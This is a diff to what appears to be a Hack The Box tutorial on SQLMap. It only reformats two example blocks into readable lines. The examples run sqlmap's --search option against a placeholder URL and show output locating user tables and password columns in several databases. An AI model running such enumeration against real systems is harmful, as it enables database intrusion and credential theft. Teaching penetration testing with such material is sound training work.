@@ -1450,13 +1450,80 @@ Table: users
 When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
 
 ```shell
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user ...SNIP... [14:24:19] [INFO] searching tables LIKE 'user' Database: testdb [1 table] +-----------------+ | users           | +-----------------+ Database: master [1 table] +-----------------+ | users           | +-----------------+ Database: information_schema [1 table] +-----------------+ | USER_PRIVILEGES | +-----------------+ Database: mysql [1 table] +-----------------+ | user            | +-----------------+ do you want to dump found table(s) entries? [Y/n]  ...SNIP...`
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
+
+...SNIP...
+[14:24:19] [INFO] searching tables LIKE 'user'
+Database: testdb
+[1 table]
++-----------------+
+| users           |
++-----------------+
+
+Database: master
+[1 table]
++-----------------+
+| users           |
++-----------------+
+
+Database: information_schema
+[1 table]
++-----------------+
+| USER_PRIVILEGES |
++-----------------+
+
+Database: mysql
+[1 table]
++-----------------+
+| user            |
++-----------------+
+
+do you want to dump found table(s) entries? [Y/n] 
+...SNIP...
 ```
 
 In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):
 
 ```shell
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass ...SNIP... columns LIKE 'pass' were found in the following databases: Database: owasp10 Table: accounts [1 column] +----------+------+ | Column   | Type | +----------+------+ | password | text | +----------+------+ Database: master Table: users [1 column] +----------+--------------+ | Column   | Type         | +----------+--------------+ | password | varchar(512) | +----------+--------------+ Database: mysql Table: user [1 column] +----------+----------+ | Column   | Type     | +----------+----------+ | Password | char(41) | +----------+----------+ Database: mysql Table: servers [1 column] +----------+----------+ | Column   | Type     | +----------+----------+ | Password | char(64) | +----------+----------+`
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
+
+...SNIP...
+columns LIKE 'pass' were found in the following databases:
+Database: owasp10
+Table: accounts
+[1 column]
++----------+------+
+| Column   | Type |
++----------+------+
+| password | text |
++----------+------+
+
+Database: master
+Table: users
+[1 column]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| password | varchar(512) |
++----------+--------------+
+
+Database: mysql
+Table: user
+[1 column]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| Password | char(41) |
++----------+----------+
+
+Database: mysql
+Table: servers
+[1 column]
++----------+----------+
+| Column   | Type     |
++----------+----------+
+| Password | char(64) |
++----------+----------+
 ```
 
 ---
